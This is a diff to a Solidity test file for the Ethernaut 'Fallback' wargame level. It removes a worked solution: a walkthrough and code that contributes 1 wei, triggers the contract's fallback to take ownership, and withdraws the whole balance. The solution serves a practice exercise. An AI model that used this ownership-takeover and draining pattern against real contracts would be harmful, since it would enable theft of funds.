@@ -28,30 +28,6 @@ contract FallbackTest is Test {
         /****************
          *    Attack     *
          *************** */
-        /*
-         * The goal of this level are :
-         * 1- claim ownership
-         * 2- reduce the balance to 0
-         *
-         * Walkthrough :
-         * 1) Contribute 1 wei - verify contract state has been updated
-         * NB:  a contribution < 0.0001 ETH is needed so we are in the mapping contributions
-         * 2) Call contract with minimum value to trigger fallback
-         * 3) Verify contract owner has changed to our address
-         * 4) Withdraw from contract - Check contract balance before and after
-         */
-
-        // -- 1 --
-        ethernautFallback.contribute{value: 1 wei}();
-        assertEq(ethernautFallback.contributions(player), 1 wei);
-
-        // -- 2 --
-        (bool success, ) = payable(address(ethernautFallback)).call{value: 1 wei}("");
-        require(success);
-        // -- 3 --
-        assertEq(ethernautFallback.owner(), player);
-        //-- 4 --
-        ethernautFallback.withdraw();
 
         /*****************
          *Level Submission*
